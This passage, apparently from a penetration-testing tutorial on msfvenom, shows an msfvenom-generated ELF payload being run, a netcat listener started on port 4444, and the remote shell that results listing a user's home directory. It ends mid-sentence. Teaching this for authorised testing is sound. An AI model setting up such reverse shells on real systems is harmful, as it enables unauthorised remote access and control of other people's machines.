# Using msfvenom (continued)

```
kilroy:~$ chmod +x payload
kilroy:~$ ./payload
kilroy:~$ file payload
payload: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically
linked, no section header
```

Before running the payload that we have in executable form, we need to have our netcat listener running. In the following code listing, you can see what it looks like when we start up netcat on the port to which the payload will be connecting. What you will notice is that there is no indication that netcat is listening or that it has received a connection. Since I was sitting in front of both ends, I knew when the connection had been made so I was able to send a command back to the payload program that was running. This is an advantage of using something like a Meterpreter shell and listener. When you get a connection there, you will be able to see when you get a connection back.

# Netcat Connection

```
kilroy:~$ nc -lp 4444
ls
Desktop
Documents
Downloads
Empire
Music
Pictures
Public
Templates
Videos
client
client.c
dotfiles.tar.gz
fontconfig
go
mail
payload
prltools
request.ps1
sps18-129
src
teamviewer_amd64.deb
```

Of course, as with any connection, we have the permissions of the user running the program. What you can see above is a directory listing of the home directory of a regular user. This is the directory from which the payload program is running. You are not capped there,